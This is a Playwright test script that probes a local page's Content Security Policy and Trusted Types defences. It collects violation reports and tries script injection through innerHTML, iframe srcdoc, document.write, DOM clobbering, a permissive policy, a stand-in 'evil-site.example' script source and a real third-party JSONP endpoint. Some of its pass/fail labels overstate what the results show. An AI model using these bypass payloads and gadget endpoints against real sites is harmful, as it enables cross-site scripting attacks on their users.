const { chromium } = require('playwright');
const http = require('http');

async function testCSPWithViolations() {
  // Start a server to collect CSP violation reports
  let violationReports = [];
  const reportServer = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/collect-violations') {
      let body = '';
      req.on('data', chunk => {
        body += chunk.toString();
      });
      req.on('end', () => {
        try {
          const report = JSON.parse(body);
          violationReports.push(report);
          console.log('CSP Violation Captured:', JSON.stringify(report, null, 2));
        } catch (e) {
          console.error('Error parsing CSP report:', e);
        }
        res.statusCode = 204;
        res.end();
      });
    } else {
      res.statusCode = 404;
      res.end();
    }
  });
  
  // Start the report server on port 8888
  reportServer.listen(8888);
  console.log('CSP violation collection server started on port 8888');
  
  const browser = await chromium.launch({ headless: false });
  const context = await browser.newContext();
  const page = await context.newPage();
  
  console.log('Testing CSP bypass techniques...');
  
  try {
    // First get the page normally to see its CSP
    await page.goto('http://localhost:3000/csp-test');
    await page.waitForTimeout(1000);
    
    // Get the CSP header from the page
    const cspHeader = await page.textContent('#csp-header');
    console.log('\nCSP Configuration:');
    console.log(cspHeader);
    
    console.log('\n===== Running CSP Bypass Tests =====');
    
    // Test 1: Try to exploit with script in different contexts
    console.log('\n1. Testing script injection in different contexts...');
    const test1Results = await page.evaluate(() => {
      const results = [];
           
      // Try setting innerHTML with a script
      try {
        document.body.innerHTML += '<script>console.log("CSP Bypass!")</script>';
        results.push('VULNERABLE: innerHTML script worked');
      } catch (e) {
        results.push('Protected: innerHTML script blocked - ' + e.message);
      }
      
      // Try creating a script element
      try {
        const script = document.createElement('script');
        script.textContent = 'console.log("CSP Bypass!")';
        document.body.appendChild(script);
        results.push('VULNERABLE: script element worked');
      } catch (e) {
        results.push('Protected: script element blocked - ' + e.message);
      }
      
      return results;
    });
    
    // Display the results in Node context
    test1Results.forEach(result => console.log('  ' + result));
    
    // Test 2: Test JSONP bypass
    console.log('\n2. Testing JSONP/external script bypass...');
    const test2Results = await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.src = 'https://evil-site.example/jsonp?callback=alert("CSP Bypass!")';
        document.body.appendChild(script);
        return 'VULNERABLE: JSONP injection attempted';
      } catch (e) {
        return 'Protected: JSONP injection blocked - ' + e.message;
      }
    });
    
    console.log('  ' + test2Results);
    
    // Test 3: Test iframe injection
    console.log('\n3. Testing iframe injection...');
    const test3Results = await page.evaluate(() => {
      try {
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '<script>parent.console.log("CSP Bypass!");</script>';
        document.body.appendChild(iframe);
        return 'VULNERABLE: iframe srcdoc injection attempted';
      } catch (e) {
        return 'Protected: iframe srcdoc injection blocked - ' + e.message;
      }
    });
    
    console.log('  ' + test3Results);
    
    console.log('\n===== Testing Trusted Types Bypass Attempts =====');

    // 1. Test innerHTML with script injection
    console.log('\n1. Testing Trusted Types with innerHTML script injection...');
    const tt1Results = await page.evaluate(() => {
      try {
        const div = document.createElement('div');
        div.innerHTML = '<script>console.log("Trusted Types bypass via innerHTML")</script>';
        document.body.appendChild(div);
        return "WARNING: Trusted Types bypass succeeded via innerHTML!";
      } catch (e) {
        return "Trusted Types properly blocked innerHTML script injection: " + e.message;
      }
    });
    
    console.log('  ' + tt1Results);

    // 2. Test direct script element creation and manipulation
    console.log('\n2. Testing Trusted Types with script.src manipulation...');
    const tt2Results = await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.src = 'data:text/javascript,console.log("Trusted Types bypass via script.src")';
        document.body.appendChild(script);
        return "WARNING: Trusted Types bypass succeeded via script.src!";
      } catch (e) {
        return "Trusted Types properly blocked script.src manipulation: " + e.message;
      }
    });
    
    console.log('  ' + tt2Results);

    // 3. Test document.write with script injection
    console.log('\n3. Testing Trusted Types with document.write...');
    const tt3Results = await page.evaluate(() => {
      try {
        document.write('<script>console.log("Trusted Types bypass via document.write")</script>');
        return "WARNING: Trusted Types bypass succeeded via document.write!";
      } catch (e) {
        return "Trusted Types properly blocked document.write: " + e.message;
      }
    });
    
    console.log('  ' + tt3Results);

    // 4. Test DOM clobbering techniques
    console.log('\n4. Testing Trusted Types with DOM clobbering attempt...');
    const tt4Results = await page.evaluate(() => {
      try {
        // Create elements that could be used for DOM clobbering
        const div = document.createElement('div');
        div.innerHTML = '<form id="trustedTypes"><input name="createHTML"></form>';
        document.body.appendChild(div);
        
        // Now try to use the clobbered form as if it were the trustedTypes object
        const elem = document.createElement('div');
        elem.innerHTML = window.trustedTypes.createHTML('<script>alert("DOM Clobbering")</script>');
        
        return "WARNING: Possible DOM clobbering success against Trusted Types!";
      } catch (e) {
        return "Trusted Types is not vulnerable to DOM clobbering: " + e.message;
      }
    });
    
    console.log('  ' + tt4Results);

    // 5. Test creating a disallowed policy
    console.log('\n5. Testing Trusted Types policy creation restrictions...');
    const tt5Results = await page.evaluate(() => {
      if (window.trustedTypes) {
        try {
          const policy = trustedTypes.createPolicy('evil-policy', {
            createHTML: (s) => s // Allow any HTML without sanitization
          });
          return "WARNING: Created unauthorized Trusted Types policy 'evil-policy'!";
        } catch (e) {
          return "Properly blocked unauthorized policy creation: " + e.message;
        }
      } else {
        return "Trusted Types is not supported in this browser";
      }
    });
    
    console.log('  ' + tt5Results);

    // 6. Consolidated DOM manipulation test
    console.log('\n6. Testing Trusted Types coverage of DOM manipulation methods...');
    const tt6Results = await page.evaluate(() => {
      // Test various properties that might not be covered by Trusted Types
      const testMethods = [
        { name: 'iframe.srcdoc', test: () => {
          const iframe = document.createElement('iframe');
          iframe.srcdoc = '<script>parent.console.log("Trusted Types bypass via iframe.srcdoc")</script>';
          document.body.appendChild(iframe);
          return "iframe.srcdoc manipulation succeeded";
        }},
        { name: 'Element.insertAdjacentHTML', test: () => {
          const div = document.createElement('div');
          div.insertAdjacentHTML('afterbegin', '<script>console.log("Trusted Types bypass via insertAdjacentHTML")</script>');
          document.body.appendChild(div);
          return "insertAdjacentHTML manipulation succeeded";
        }},
        { name: 'Range.createContextualFragment', test: () => {
          const range = document.createRange();
          const fragment = range.createContextualFragment('<script>console.log("Trusted Types bypass via createContextualFragment")</script>');
          document.body.appendChild(fragment);
          return "createContextualFragment manipulation succeeded";
        }}
      ];
      
      const results = [];
      for (const method of testMethods) {
        try {
          const result = method.test();
          results.push(`WARNING: ${method.name} - ${result}`);
        } catch (e) {
          results.push(`${method.name} properly protected by Trusted Types: ${e.message}`);
        }
      }
      return results;
    });
    
    tt6Results.forEach(result => console.log('  ' + result));

    // 7. JSONP Endpoints Test
    console.log('\n7. Testing if external JSONP endpoints can execute arbitrary JavaScript');
    const tt7Results = await page.evaluate(() => {
      try {
        const script = document.createElement('script');
        script.src = 'https://acs.aliexpress.com/api?callback=alert';
        document.body.appendChild(script);
        return "WARNING: Script loaded from unauthorized JSONP endpoint";
      } catch (e) {
        return "Protected: JSONP endpoint script was blocked: " + e.message;
      }
    });
    
    console.log('  ' + tt7Results);

    // Wait a bit for any violations to be reported
    await page.waitForTimeout(2000);
    
    // Display violation report summary
    console.log('\n===== CSP Violation Report Summary =====');
    console.log(`Total violations detected: ${violationReports.length}`);
    
    const violationTypes = {};
    violationReports.forEach(report => {
      const directive = report['csp-report'] ? 
                       report['csp-report']['violated-directive'] : 
                       'unknown';
      violationTypes[directive] = (violationTypes[directive] || 0) + 1;
    });
    
    console.log('\nViolation types:');
    Object.keys(violationTypes).forEach(directive => {
      console.log(`- ${directive}: ${violationTypes[directive]} violations`);
    });
    
    // Determine overall security status
    const trustedTypesViolations = violationTypes['require-trusted-types-for'] || 0;
    const scriptSrcViolations = violationTypes['script-src'] || 0;
    
    console.log('\n===== SECURITY ASSESSMENT =====');
    
    if (trustedTypesViolations > 0) {
      console.log('Trusted Types are properly enforced - all attempts were blocked');
    } else {
      console.log('No Trusted Types violations detected - may indicate lack of enforcement');
    }
    
    if (Object.keys(violationTypes).length > 1) {
      console.log('Multiple CSP directives are active and enforcing restrictions');
    }
    
  } catch (error) {
    console.error('Error during testing:', error);
  } finally {
    await browser.close();
    reportServer.close();
    console.log('Test completed and servers shut down');
  }
}

testCSPWithViolations().catch(console.error);